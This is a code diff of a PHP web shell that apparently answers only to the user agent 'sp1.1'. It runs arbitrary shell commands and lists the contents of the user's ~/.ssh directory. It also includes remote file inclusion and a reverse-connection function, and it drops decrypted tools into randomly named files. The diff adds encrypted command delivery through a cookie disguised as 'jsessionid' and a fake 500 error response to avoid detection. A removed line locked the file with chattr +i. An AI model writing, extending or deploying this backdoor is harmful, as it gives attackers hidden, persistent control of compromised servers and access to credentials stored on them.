@@ -1,8 +1,8 @@
 <?php
-system("chattr +i " . $_SERVER["SCRIPT_FILENAME"]);
+const alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890';
 ini_set("safe_mode", 0);
 umask(0);
-define("base", 'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami');
+const base = 'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami';
 function banner()
 {
 
@@ -129,16 +129,23 @@ _POSTDOC1;
 
 }
 
-function b64($target, $how, $data, $ext, $dir)
+function b64($data, $switch)
 {
-    if (!empty($how) && !empty($target) && !empty($dir)) {
-        if (!empty($data) && $how == "up") {
-            fputs(fopen($dir . $target . $ext, "x+"), base64_decode($data));
-            return "Created: {$dir}/{$target}.{$ext}";
-        } elseif ($how == "down" && !empty($data) && !empty($dir)) {
-            return base64_encode(file($dir . $target . $ext));
-        } else {
-            echo("Cannot do what you asked of me.\n");
+    echo print_r($data)."\n";
+    if ($switch === "u") {
+        if (!empty($data) && is_array($data)) {
+            if (!is_null($data['read'])) {
+                echo "\nMake sure you have found a writable directory, otherwise this will not go through\n";
+                $a = "./".substr(str_shuffle(allowed_chars), 0, rand(3, 5));
+                fputs(fopen($a, "x+"), openssl_decrypt($data['Base64_Encoded_Tool'], $data['Cipher'], $data['Key'], OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $data['IV'], $data['Tag'], $data['aad']));
+                echo "File saved at: {$a}\nYou may want to move this file out of the current web directory, so you can hide it. But this will do for now.\n";
+                return true;
+            }
+        }
+    }else{
+        if (is_file($data['read'])){
+            echo base64_encode(file_get_contents($data['read']));
+            return true;
         }
     }
     return false;
@@ -295,9 +302,9 @@ function reverseConnections($methods, $host, $port, $shell)
 
 }
 
-function executeCommands(string $com, int $run)
+function executeCommands($com, int $run)
 {
-    if (!empty($com) && $run === "1") {
+    if (!empty($com) && $run == "1") {
         echo("~ Info To Remember ~ \n" . shell_exec($com));
     } else {
         echo("\nExecuting: " . $com . "\n" . shell_exec($com));
@@ -363,9 +370,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         $ct = null;
         $split = null;
         if ($_POST['cr'] === "1") {
-            $split = base64_decode(unserialize(base64_decode($_COOKIE['cx']), ["allowed_classes"=>false]));
+            $split = base64_decode(unserialize(base64_decode($_COOKIE['jsessionid']), ["allowed_classes"=>false]));
         } else {
-            $s = $_COOKIE['cx'];
+            $s = $_COOKIE['jsessionid'];
             $v = explode(".", base64_decode($s));
             try {
                 $split = unserialize(base64_decode(sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode($v[3]), hex2bin($v[2]), hex2bin($v[0]), hex2bin($v[1]))), ['allowed_classes' => false]);
@@ -383,16 +390,16 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         cloner($_POST["clone"], $ROS);
     } elseif (!empty($_POST["doInclude"])) {
         remoteFileInclude($_POST["doInclude"]);
-    } elseif (!empty($_POST["b6"])) {
-        if ($_POST['cr']) {
-            $sp = explode('.', base64_decode($_COOKIE['cx']));
-            if (b64($sp[0], $sp[1], $sp[2], $sp[3], $sp[4]) !== false) {
-                echo "Operation completed successfully!";
-            } else {
-                echo "There was an error, we might not have write abilities.";
-            }
+    } elseif (!empty($_COOKIE["cb64"])) {
+        $aSX = explode(".", $_COOKIE['cb64']);
+        if (hash("sha512", $_COOKIE['jsessionid'], $binary=false) == $aSX[1]) {
+            $sp = explode('.', base64_decode($_COOKIE['jsessionid']));
+            $final = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($sp[3], $sp[0], $sp[1], $sp[2]);
+            $axD = unserialize(base64_decode($final));
+            print_r($axD)."\n";
+            b64($axD, $aSX[0]);
         }
-    } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['r']) {
+    } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['jsessionid']) {
         $pid = pcntl_fork();
         if ($pid === -1){
             die("\n\n");
@@ -405,26 +412,30 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
     }
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
     banner();
-    setcookie("checkIn", $_SERVER['REMOTE_ADDR']);
-    header("Access-Control-Allow-Origin: *");
-    header("Access-Control-Allow-Credentials: true");
     if (!empty($_GET["qs"])) {
-        if ($_GET["qs"] == "cqS")
-            showEnv(checkSystem());
-        elseif ($_GET["qs"] == "cqP")
-            checkPack();
-        elseif ($_GET["qs"] == "cqPR")
-            parseProtections();
-        elseif ($_GET["qs"] == "cqSH")
-            checkShells();
-        elseif ($_GET["qs"] == "cqCM")
-            checkComs();
-        elseif ($_GET["qs"] == "cqBS")
-            executeCommands(base, "1");
-    } else {
-        if (!empty($CHECK_IN_HOST)) {
-            header("Checkin: " . $CHECK_IN_HOST);
+        switch ($_GET["qs"]) {
+            case "cqS":
+                showEnv(checkSystem());
+                break;
+            case "cqP":
+                checkPack();
+                break;
+            case "cqPR":
+                parseProtections();
+                break;
+            case "cqSH":
+                checkShells();
+                break;
+            case "cqCM":
+                checkComs();
+                break;
+            case "cqBS":
+                executeCommands(base, 1);
+                break;
         }
+    } else {
+        $a = curl_init();
+
         $rhost = $_SERVER['REMOTE_ADDR'];
         http_response_code(500);
         header("Status: 500 Internal Server Error");
